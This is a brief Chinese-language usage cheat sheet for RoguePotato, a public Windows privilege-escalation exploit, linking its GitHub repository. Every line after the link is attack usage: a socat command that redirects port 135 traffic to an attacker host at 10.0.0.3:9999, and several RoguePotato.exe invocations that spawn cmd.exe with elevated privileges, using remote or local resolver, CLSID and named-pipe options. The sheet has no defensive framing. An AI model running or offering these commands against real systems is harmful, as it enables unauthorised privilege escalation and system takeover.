	Rogue Potato
	https://github.com/antonioCoco/RoguePotato
	要在远程机器上运行端口转发，必须使用端口 135 作为源端口
	socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

	在远程计算机上运行 RogueOxidResolver.exe
	如果您有防火墙限制，请使用此选项
	RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"

	RoguePotato 与 RogueOxidResolver 在本地9999端口运行
	RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999

	以特定的 clsid 和自定义管道执行
	RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode